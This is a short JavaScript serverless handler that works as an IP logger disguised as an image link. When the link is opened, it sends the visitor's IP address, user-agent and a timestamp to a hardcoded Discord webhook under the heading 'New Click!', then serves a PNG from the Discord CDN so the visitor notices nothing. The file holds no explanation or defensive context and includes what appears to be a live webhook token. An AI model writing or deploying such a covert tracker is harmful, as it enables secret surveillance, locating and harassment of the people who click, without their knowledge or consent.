import https from 'https';

export default async function handler(req, res) {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const ua = req.headers['user-agent'] || 'unknown';
    const time = new Date().toISOString();

    const webhook = 'https://discord.com/api/webhooks/1532494338477785189/piKPDYGbTysmL3tPK_HQckufpf28oSRKvUAGkt5aHA2EiSyGAMZyOphc464WIJA20Atr';
    const message = `**New Click!**\nIP: ${ip}\nUA: ${ua}\nTime: ${time}`;

    const payload = JSON.stringify({ content: message });
    const options = {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': payload.length }
    };
    const discordReq = https.request(webhook, options, () => {});
    discordReq.write(payload);
    discordReq.end();

    const imageUrl = 'https://cdn.discordapp.com/attachments/1522326026577772655/1533982395751993384/IMG_4389.png?ex=6a7277ef&is=6a71266f&hm=47bcf3074877494ca17b5451c61e4945469dce0c8e752e4fd2d457b27131d29e&';
    const imageRes = await fetch(imageUrl);
    res.setHeader('Content-Type', 'image/png');
    res.status(200).send(Buffer.from(await imageRes.arrayBuffer()));
}
